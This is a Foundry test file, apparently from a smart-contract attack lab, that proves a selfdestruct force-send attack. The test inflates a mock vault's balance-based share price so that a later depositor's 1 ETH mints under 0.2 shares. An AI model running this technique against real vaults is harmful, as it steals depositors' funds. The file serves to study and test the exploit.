// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockSavingsVault.sol";
import "../src/attacks/force_send_break.sol";

/**
 * @title ForceSendBreakTest
 * @notice Proves the `force_send_break` template: a selfdestruct force-sends
 *         ETH into a vault that prices shares by balanceOf, inflating the
 *         share price and breaking accounting.
 * @dev lab/foundry.toml uses evm_version = "paris" so selfdestruct transfers
 *      the balance (pre-Cancun semantics).
 */
contract ForceSendBreakTest is Test {
    MockSavingsVault public vault;
    ForceSender public sender;
    ForceSendBreak public check;
    address public victim = makeAddr("victim");

    function setUp() public {
        vault = new MockSavingsVault(address(this));
        sender = new ForceSender();
        check = new ForceSendBreak(address(vault));

        // victim deposited 1 ETH -> 1 share
        vm.deal(victim, 1 ether);
        vm.startPrank(victim);
        vault.deposit{value: 1 ether}(1 ether, victim);
        vm.stopPrank();
    }

    function testForceSendBreak() public {
        // attacker force-sends 5 ETH via selfdestruct (no msg.value — the
        // whole contract balance goes to the target)
        vm.deal(address(sender), 5 ether);
        sender.forceSend(address(vault));

        // totalAssets jumped 5 ETH without minting shares
        assertEq(vault.totalAssets(), 6 ether, "assets inflated by force-send");
        assertEq(vault.totalSupply(), 1 ether, "supply unchanged");

        // a new depositor's 1 ETH now mints a fraction of fair 1:1 value
        // (fair would be 1 share; the 6x share price leaves them ~1/7 share)
        vm.deal(address(this), 1 ether);
        uint256 shares = vault.deposit{value: 1 ether}(1 ether, address(this));
        assertLt(shares, 0.2 ether, "rounding theft after force-send");
        assertGt(shares, 0, "deposit fully stolen");
    }
}
